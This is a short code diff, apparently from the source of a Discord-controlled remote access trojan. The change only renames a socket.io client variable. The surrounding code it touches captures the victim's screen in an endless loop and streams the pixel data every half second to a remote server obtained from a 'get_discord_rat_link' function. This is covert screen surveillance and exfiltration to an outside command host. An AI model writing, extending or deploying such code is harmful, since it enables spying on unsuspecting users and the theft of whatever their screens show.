@@ -139,12 +139,12 @@ class CommandHandler():
 
             from mss import mss
 
-            sio = socketio.Client()
+            _sio = socketio.Client()
 
             WIDTH = 1900
             HEIGHT = 1000
 
-            @sio.event
+            @_sio.event
             def connect():
                 while True:
                     with mss() as sct:
@@ -171,14 +171,14 @@ class CommandHandler():
                             # Send pixels
                             #conn.sendall(pixels)
                             
-                            sio.emit('sending_screenshot', {'data': {
+                            _sio.emit('sending_screenshot', {'data': {
                                 'size_len': final_size_len,
                                 'size_bytes': final_size_bytes, 
                                 'pixels': pixels
                             }})
                             time.sleep(0.5) #Don't overload the server
                             
-            sio.connect(cc.get_discord_rat_link())
+            _sio.connect(cc.get_discord_rat_link())
             
         t = threading.Thread(target=to_execute, args=(self,))
         t.run()
